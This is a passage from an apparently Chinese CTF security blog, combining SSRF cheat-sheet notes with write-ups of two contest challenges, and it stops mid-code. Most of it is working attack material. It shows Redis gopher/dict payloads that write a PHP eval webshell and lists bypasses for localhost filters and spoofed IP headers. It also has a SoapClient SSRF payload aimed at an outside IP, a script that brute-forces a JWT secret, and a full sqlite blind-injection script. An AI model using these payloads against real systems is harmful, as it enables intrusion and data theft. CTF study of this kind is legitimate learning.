<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">webshell</span>():</span></span><br><span class="line">s=<span class="string">&#x27;&#x27;&#x27;auth 123123</span></span><br><span class="line"><span class="string">set mars &quot;&lt;?php eval($_POST[0]);?&gt;&quot;</span></span><br><span class="line"><span class="string">config set dir /tmp/</span></span><br><span class="line"><span class="string">config set dbfilename shell.php</span></span><br><span class="line"><span class="string">save</span></span><br><span class="line"><span class="string">quit&#x27;&#x27;&#x27;</span></span><br><span class="line">	print(urlencode(gopher(s)))</span><br></pre></td></tr></table></figure>

<h3 id="DICT-的利用"><a href="#DICT-的利用" class="headerlink" title="DICT://的利用"></a>DICT://的利用</h3><h4 id="爆破端口"><a href="#爆破端口" class="headerlink" title="爆破端口"></a>爆破端口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:8000</span><br></pre></td></tr></table></figure>

<p>通过回显看端口是否开启</p>
<h4 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:8000&#x2F;auth;123123(密码)</span><br></pre></td></tr></table></figure>

<p>通过回显看密码，密码一般是123456或者admin或者123123</p>
<h4 id="备份文件写马-1"><a href="#备份文件写马-1" class="headerlink" title="备份文件写马"></a>备份文件写马</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dict:&#x2F;&#x2F;127.0.0.1:8001&#x2F;config:set:dbfilename:webshell.php</span><br><span class="line">dict:&#x2F;&#x2F;127.0.0.1:8001&#x2F;config:set:dir:&#x2F;tmp</span><br><span class="line">dict:&#x2F;&#x2F;127.0.0.1:8001&#x2F;set:webshell:&quot;\x3c\x3f\x70\x68\x70\x20\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x20\x3f\x3e&quot;</span><br></pre></td></tr></table></figure>

<h3 id="主从复制RCE"><a href="#主从复制RCE" class="headerlink" title="主从复制RCE"></a>主从复制RCE</h3><p>使用两个工具：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;n0b0dyCN&#x2F;redis-rogue-server</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;redis-rce</span><br></pre></td></tr></table></figure>

<p>使用redis-rce加载redis-rogue-server-master的恶意模块exp.so，即可实现RCE</p>
<h3 id="写无损文件"><a href="#写无损文件" class="headerlink" title="写无损文件"></a>写无损文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;r35tart&#x2F;RedisWriteFile</span><br></pre></td></tr></table></figure>

<p>使用此软件联通即可写无损文件</p>
<h2 id="SSRF-Trick"><a href="#SSRF-Trick" class="headerlink" title="SSRF Trick"></a>SSRF Trick</h2><h3 id="绕过访问限制"><a href="#绕过访问限制" class="headerlink" title="绕过访问限制"></a>绕过访问限制</h3><h4 id="对访问的限制"><a href="#对访问的限制" class="headerlink" title="对访问的限制"></a>对访问的限制</h4><p>file协议+域名+读文件地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;localhost&#x2F;var&#x2F;www&#x2F;html&#x2F;config.php</span><br></pre></td></tr></table></figure>

<p>1.过滤file，可使用File://大小写绕过试试<br>2.提交内容末尾添加/等内容可使用?或者#进行注释<br>3.url可以加参数绕过过滤</p>
<h4 id="对本地的访问限制-对访问协议的限制"><a href="#对本地的访问限制-对访问协议的限制" class="headerlink" title="对本地的访问限制/对访问协议的限制"></a>对本地的访问限制/对访问协议的限制</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">跳转&#x2F;解析到127.0.0.1：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1.nip.io&#x2F;flag.php</span><br><span class="line"></span><br><span class="line">编码绕过：进制转换</span><br><span class="line">http:&#x2F;&#x2F;0x7f.0.0.1&#x2F;flag.php</span><br><span class="line"></span><br><span class="line">特殊字符绕过</span><br><span class="line">http:&#x2F;&#x2F;①②⑦.⓪.⓪.①&#x2F;flag.php</span><br><span class="line">http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;flag.php</span><br><span class="line">http:&#x2F;&#x2F;127。0。0。1&#x2F;flag.php</span><br><span class="line">http:&#x2F;&#x2F;127.1&#x2F;flag.php</span><br><span class="line">http:&#x2F;&#x2F;[::]:80&#x2F;flag.php</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1.&#x2F;flag.php</span><br></pre></td></tr></table></figure>

<p>遇到需要127.0.0.1访问：直接使用以下内容进行绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">X-Forwarded:127.0.0.1</span><br><span class="line">Forwarded-For:127.0.0.1</span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line">X-Forwarded-Host:127.0.0.1</span><br><span class="line">X-remote-IP:127.0.0.1</span><br><span class="line">X-remote-addr:127.0.0.1</span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line">X-Client-IP:127.0.0.1</span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line">X-Real-IP:127.0.0.1</span><br><span class="line">Ali-CDN-Real-IP:127.0.0.1</span><br><span class="line">Cdn-Src-Ip:127.0.0.1</span><br><span class="line">Cdn-Real-Ip:127.0.0.1</span><br><span class="line">CF-Connecting-IP:127.0.0.1</span><br><span class="line">X-Cluster-Client-IP:127.0.0.1</span><br><span class="line">WL-Proxy-Client-IP:127.0.0.1</span><br><span class="line">Proxy-Client-IP:127.0.0.1</span><br><span class="line">Fastly-Client-Ip:127.0.0.1</span><br><span class="line">True-Client-Ip:127.0.0.1</span><br></pre></td></tr></table></figure>

<h4 id="进制的转换"><a href="#进制的转换" class="headerlink" title="进制的转换"></a>进制的转换</h4><p>可以使用一些不同的进制替代ip地址，从而绕过WAF</p>
<h4 id="利用DNS解析"><a href="#利用DNS解析" class="headerlink" title="利用DNS解析"></a>利用DNS解析</h4><p>如果你自己有域名的话，可以在域名上设置A记录，指向127.0.0.1。</p>
<h4 id="利用-绕过"><a href="#利用-绕过" class="headerlink" title="利用@绕过"></a>利用@绕过</h4><p><a target="_blank" rel="noopener" href="http://www.baidu.com@127.0.0.1与http//127.0.0.1%E8%AF%B7%E6%B1%82%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84">http://www.baidu.com@127.0.0.1与http://127.0.0.1请求是相同的</a></p>
<h4 id="file-get-contents-中的trick"><a href="#file-get-contents-中的trick" class="headerlink" title="file_get_contents()中的trick"></a>file_get_contents()中的trick</h4><p>有关file_get_contents()函数的一个trick，可以看作是SSRF的一个黑魔法，当PHP的 file_get_contents()函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">httpsssss:&#x2F;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/255456.html">https://www.freebuf.com/articles/network/255456.html</a></p>
<h2 id="PHP-parse-url"><a href="#PHP-parse-url" class="headerlink" title="PHP parse_url()"></a>PHP parse_url()</h2><p>漏洞产生原因：</p>
<p>Parse_url和访问url是两件事，这两件事对url的处理存在差异 </p>
<p>漏洞利用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;y1ng.vip\@flag.authenticator.das.ctf:80&#x2F;则会访问到</span><br><span class="line"></span><br><span class="line">flag.authenticator.das.ctf:80&#x2F; </span><br></pre></td></tr></table></figure>



<h2 id="Apache-SSRF"><a href="#Apache-SSRF" class="headerlink" title="Apache SSRF"></a>Apache SSRF</h2><h3 id="任意读取："><a href="#任意读取：" class="headerlink" title="任意读取："></a>任意读取：</h3><p><a target="_blank" rel="noopener" href="https://github.com/ev0A/ArbitraryFileReadList/">https://github.com/ev0A/ArbitraryFileReadList/</a></p>
<p>读配置文件，发现其他端口</p>
<h3 id="无gopher和dict如何ssrf"><a href="#无gopher和dict如何ssrf" class="headerlink" title="无gopher和dict如何ssrf"></a>无gopher和dict如何ssrf</h3><p>使用soap反序列化可以发送post请求</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&#x27;http://123.206.216.198/bbb.php&#x27;</span>;</span><br><span class="line">$post_string = <span class="string">&#x27;a=b&amp;flag=aaa&#x27;</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: xxxx=1234&#x27;</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&#x27;%0d%0a&#x27;</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;%26&#x27;</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p>验证和访问分开，验证一个合法的域名，然后在这个域名写写一个重定向的指令<br>可以重定向的域名生成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;requestrepo.com&#x2F;#&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;lock.cmpxchg8b.com&#x2F;rebinder.html</span><br></pre></td></tr></table></figure>

<h2 id="CTF中的内网渗透"><a href="#CTF中的内网渗透" class="headerlink" title="CTF中的内网渗透"></a>CTF中的内网渗透</h2><p>flag一般不在拿shell的这个机器上<br>如果是有一个共同上传的地方，意味着upload目录下是一个777的权限，可以直接去扫获取别队伍上传的信息<br>对于打内网：<br>通过ifconfig看ip地址（windows）<br>通过/etc/hosts<br>首先扫描ip看是否有存活主机，再将所有存活主机ip列出来，<br>HTTP服务-&gt;扫服务（端口）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">扫描工具：</span><br><span class="line">masscan nmap goby等工具</span><br></pre></td></tr></table></figure>

<p>getshell以后发现权限不够，可以使用ps（获取进程，看看运行了什么进程）<br>或者开netstat<br>自己再80端口，然后shell在8006端口该如何解决？<br>frp工具： </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/31/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-31</time><div class="content"><h2 id="1127"><a href="#1127" class="headerlink" title="1127"></a>1127</h2><p>可以看源码，所以直接查看源码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.session.won &gt;= <span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;you won&quot;</span>)</span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign (</span><br><span class="line">            &#123;</span><br><span class="line">                id : req.session.want_to_eat,</span><br><span class="line">                is_win : <span class="string">&quot;true&quot;</span></span><br><span class="line">            &#125;, env.parsed.rockyou, &#123;</span><br><span class="line">                expiresIn: <span class="number">3600</span> * <span class="number">12</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        res.cookie(<span class="string">&quot;token&quot;</span>, token, &#123;</span><br><span class="line">            maxAge: <span class="number">3600</span> * <span class="number">12</span>,</span><br><span class="line">            httpOnly: <span class="literal">true</span></span><br><span class="line">        &#125;);</span><br><span class="line">        req.session.is_win = <span class="string">&quot;true&quot;</span></span><br><span class="line">        res.redirect(<span class="string">&quot;/award&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果圣诞老人赢了5次那么你就输了</span></span><br><span class="line">    <span class="keyword">if</span> ( req.session.santa &gt; <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        req.session.destroy()</span><br><span class="line">        res.render(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>赢100次就胜利，显然不太可能，于是继续看看其他地方，这里发现session可以被player的属性赋值，那么如果我们将player这里就对won属性赋值&gt;100不就可以了吗，初步推断可能存在原型链污染之类</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/start&#x27;</span>, <span class="function">(<span class="params">req, res</span>)=&gt;</span>&#123;  </span><br><span class="line"><span class="keyword">if</span> ( player.name )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> player)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (req.session.hasOwnProperty(i))</span><br><span class="line">                req.session[i] = player[i]</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                res.end(<span class="string">&quot;Do you think i am stupid?&quot;</span>)</span><br><span class="line">                player = &#123;&#125;</span><br><span class="line">                req.session.destroy()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>但是在另一个地方：发现有对won的重新赋值，所以应该还要再考虑一下原型链污染的一个顺序问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.post(&#39;&#x2F;start&#39;, (req, res)&#x3D;&gt;&#123;</span><br><span class="line">    if ( !req.cookies.token || !req.session.name )</span><br><span class="line">    &#123;</span><br><span class="line">        res.status(403).send(&quot;you are not allowed to visit this page&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ( !req.session.won )</span><br><span class="line">        req.session.won &#x3D; 0</span><br><span class="line"></span><br><span class="line">    if ( !req.session.santa )</span><br><span class="line">        req.session.santa &#x3D; 0</span><br></pre></td></tr></table></figure>

<p>最后再POST /这个路由中看到，果然有可以污染的地方</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">player[i] = tempPlayer[i]</span><br></pre></td></tr></table></figure>

<p>捋一下思路：<br>先对POST /污染一下player ——&gt;到POST /start 初始化session——&gt;GET /start 对session进行赋值，将其won属性赋值给session<br>但是我又看了一下似乎这样还是不够的,/award中还有一个is_win要是true，这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (req.user.is_win !&#x3D;&#x3D; &#39;true&#39; || req.session.is_win !&#x3D;&#x3D; &#39;true&#39; )</span><br></pre></td></tr></table></figure>

<p>向上看了一下，POST /start中有对这一项进行ture的赋值，所以应该还要再回来post /start中对这个进行赋值</p>
<p>首先把post污染一下那个won属性，然后把token复制回去替换一下去访问就可以发现player已经101分了<br><img src="/.com//blog\hexo\source\_posts\刷题记录\[I@DZ6QBHV{F@Q3UN{B_DEL.png" style="zoom:67%;"><br><img src="/.com//blog\hexo\source\_posts\刷题记录\9{K~IDZGN`5{(K5)C1@5W5V.png" style="zoom:67%;"></p>
<p>然后就有token让你跳转到/award</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210902174200.png" alt="img" style="zoom:67%;">

<p>然后无事发生？、?</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210902174426.png" alt="img" style="zoom:67%;">
回去看看源码，这边似乎要注入，但是我不知道id在哪，感觉是要伪造jwt于是再看看==

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    let patt &#x3D; &#x2F;union|like|pragma|savepoint|vacuum|detach|alter|attach|insert|update|release|rollback|load|create|drop|delete|explain|regexp|&#x3D;|&gt;|&lt;|&quot;|&#39;&#x2F;i</span><br><span class="line">    if ( req.user.id.match(patt) )</span><br><span class="line">    &#123;</span><br><span class="line">        res.status(403).end(&quot;Never Trust Your User&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    db.get(&#96;SELECT ITEM,LOG FROM AWARD WHERE id&#x3D;$&#123;req.user.id&#125;&#96;,function(err,row)&#123;</span><br><span class="line">        if (!row) &#123;</span><br><span class="line">            res.render(&quot;reward&quot;, &#123;&quot;award&quot;: &quot;&quot;, &quot;log&quot;: &quot;&quot;&#125;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line">        if (row[&quot;ITEM&quot;] &amp;&amp; row[&quot;LOG&quot;])&#123;</span><br><span class="line">            res.render(&quot;reward&quot;, &#123;&quot;award&quot;: row[&quot;ITEM&quot;], &quot;message&quot; : row[&quot;LOG&quot;]&#125; )</span><br><span class="line">        &#125; else res.render(&quot;reward&quot;, &#123;&quot;award&quot;: &quot;&quot;, &quot;log&quot;: &quot;&quot;&#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>用工具发现出不来，于是在回去找找信息：发现是要用rockyou的字典才行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">jwt_str = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjIiLCJpc193aW4iOiJmYWxzZSIsImlhdCI6MTYzMDU3MzUzOSwiZXhwIjoxNjMwNjE2NzM5fQ.mAH_mgq1JvEtgyJ3CpfF0xN-7ca_scyUrbuFZzPOIXs&quot;</span></span><br><span class="line">path = <span class="string">&quot;C:/Users/10452/Desktop/rockyou.txt&quot;</span></span><br><span class="line">alg = <span class="string">&quot;HS256&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(path,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        key_ = line.strip()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt.decode(jwt_str,verify=<span class="literal">True</span>,key=key_,algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">            print(<span class="string">&#x27;found key! --&gt; &#x27;</span> +  key_)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">            print(<span class="string">&#x27;found key! --&gt; &#x27;</span> +  key_)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>(jwt.exceptions.InvalidSignatureError):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;key not found!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>拿到key然后去换一下user看看源码这个看起来就是要盲注了吧<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210902220840.png" alt="img" style="zoom:67%;"></p>
<p>应该就是要用这个id来进行盲注了吧<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210902222950.png" alt="img" style="zoom:67%;"></p>
<p>那么接下来的思路就是构造sql注入语句，然后替换到id那边重新进行加密，但是每次要到这个/award都需要重新构造id，就要伪造jwt，这里就编写一下python脚本跑一下？<br>首先看看如何构造盲注语句：<br>根据他的结果，如果查询到就返回结果，查询不到就返回空好像，然后根据这个过滤内容，看起来不像是mysql，毕竟mysql没有vacuum这个东西吧，查了一下，这个是sqlite的东西，所以这题应该是sqlite盲注<br>盲注中的截取没咋过滤，就直接用substr就可以，然后比较符过滤了，很多，看了一下in没被过滤，所以这里考虑用in试试,由于引号都被过滤了，所以可以直接使用char函数进行绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://a.y1ng.vip:1127/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">game=<span class="string">&quot;s%3AAUHzfM13c2l68I75rIKMDLtiU8GKtpxJ.H3ugRxCwtqH1Ey6%2F1IClRNwrt8Ba5uE0FSihnsXd2kE&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jwt_boom</span>():</span></span><br><span class="line">    jwt_str = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjIiLCJpc193aW4iOiJmYWxzZSIsImlhdCI6MTYzMDU3MzUzOSwiZXhwIjoxNjMwNjE2NzM5fQ.mAH_mgq1JvEtgyJ3CpfF0xN-7ca_scyUrbuFZzPOIXs&quot;</span></span><br><span class="line">    path = <span class="string">&quot;C:/Users/10452/Desktop/rockyou.txt&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(path,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str,verify=<span class="literal">True</span>,key=key_,algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">                print(<span class="string">&#x27;found key! --&gt; &#x27;</span> +  key_)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                print(<span class="string">&#x27;found key! --&gt; &#x27;</span> +  key_)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>(jwt.exceptions.InvalidSignatureError):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;key not found!&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jwt_encode</span>(<span class="params">payload_t</span>):</span></span><br><span class="line">    json = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: payload_t,</span><br><span class="line">        <span class="string">&quot;is_win&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">        <span class="string">&quot;iat&quot;</span>: <span class="number">1630654737</span>,</span><br><span class="line">        <span class="string">&quot;exp&quot;</span>: <span class="number">1630697937</span></span><br><span class="line">    &#125;</span><br><span class="line">    token = jwt.encode(json, <span class="string">&quot;fuckoff123&quot;</span>, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord_tran</span>(<span class="params">s</span>):</span></span><br><span class="line">    fin=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        fin +=<span class="string">f&quot;<span class="subst">&#123;ord(i)&#125;</span>,&quot;</span></span><br><span class="line">    <span class="comment">#print(f&quot;chr(&#123;fin[:-1]&#125;)&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;char(<span class="subst">&#123;fin[:<span class="number">-1</span>]&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection</span>(<span class="params">payload</span>):</span></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            payload_f=<span class="string">f&quot;1 and char(<span class="subst">&#123;j&#125;</span>) in (substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1));--&quot;</span></span><br><span class="line">            <span class="comment">#print(payload_f)</span></span><br><span class="line">            token=jwt_encode(payload_f)</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&quot;cookie&quot;</span>:<span class="string">f&quot;game=<span class="subst">&#123;game&#125;</span>; token=<span class="subst">&#123;token&#125;</span>&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">#print(headers)</span></span><br><span class="line">            r=s.get(url=url+<span class="string">&#x27;award&#x27;</span>,headers=headers).text</span><br><span class="line"></span><br><span class="line">            <span class="comment">#print(r)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Turkey&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                result += chr(j)</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#jwt_boom() #key=fuckoff123</span></span><br><span class="line">    <span class="comment">#payload=&quot;SELECT group_concat(name) FROM sqlite_master&quot;#AWARD,sqlite_autoindex_AWARD_1,SECRET,sqlite_autoindex_SECRET_1</span></span><br><span class="line">    <span class="comment">#ord_tran(&quot;SECRET&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#payload=f&quot;SELECT group_concat(sql) FROM sqlite_master WHERE tbl_name in (&#123;ord_tran(&#x27;SECRET&#x27;)&#125;)&quot;#fl4ggg</span></span><br><span class="line">    payload=<span class="string">f&quot;SELECT group_concat(fl4ggg) FROM SECRET&quot;</span><span class="comment">#almost,flag&#123;f7f0f684-0abf-ffe1-c561-a186d17a0b1d&#125;</span></span><br><span class="line">    sql_injection(payload)</span><br></pre></td></tr></table></figure>

<p>sqlite注入：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8627#toc-3">https://xz.aliyun.com/t/8627#toc-3</a></p>
<h2 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h2><p>一开始我输入任何的url都没用，一直说后缀不对，原来是要在url后面加一个png。。。。所以可以用file协议读一下源码，由于过滤了var，可以通过二次url编码进行绕过，为什么用?号呢。其实这里可以理解为一个分割的作用吧，?png不影响前面地址的访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;%25%37%36ar&#x2F;www&#x2F;html&#x2F;index.php?png</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">	$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag|apache|conf|var|proc|log/i&quot;</span> ,$url))&#123;</span><br><span class="line">		$dieMess = <span class="string">&quot;Dangerous content.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		$end = substr($url, strlen($url) - <span class="number">3</span>, strlen($url));</span><br><span class="line">		<span class="keyword">if</span>($end === <span class="string">&quot;png&quot;</span>)&#123;</span><br><span class="line">			$curlobj = curl_init($url);</span><br><span class="line">			curl_setopt($curlobj, CURLOPT_TIMEOUT, <span class="number">200</span>);</span><br><span class="line">			curl_setopt($curlobj, CURLOPT_URL, $url); </span><br><span class="line">			curl_setopt($curlobj, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">			curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">			$res = curl_exec($curlobj);</span><br><span class="line">			<span class="keyword">if</span>(ord($res) &lt; <span class="number">0x80</span>)&#123;</span><br><span class="line">				$dieMess = $res;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			$httpCode = curl_getinfo($curlobj, CURLINFO_HTTP_CODE);</span><br><span class="line">			var_dump($httpCode); </span><br><span class="line">			<span class="keyword">if</span>($httpCode &lt; <span class="number">300</span>)&#123;</span><br><span class="line">				$down = curl_init($url);</span><br><span class="line">				$tmpFile = tempnam(sys_get_temp_dir(), <span class="string">&#x27;image&#x27;</span>);</span><br><span class="line">				$resource = fopen($tmpFile, <span class="string">&#x27;wb&#x27;</span>);</span><br><span class="line">				curl_setopt($down, 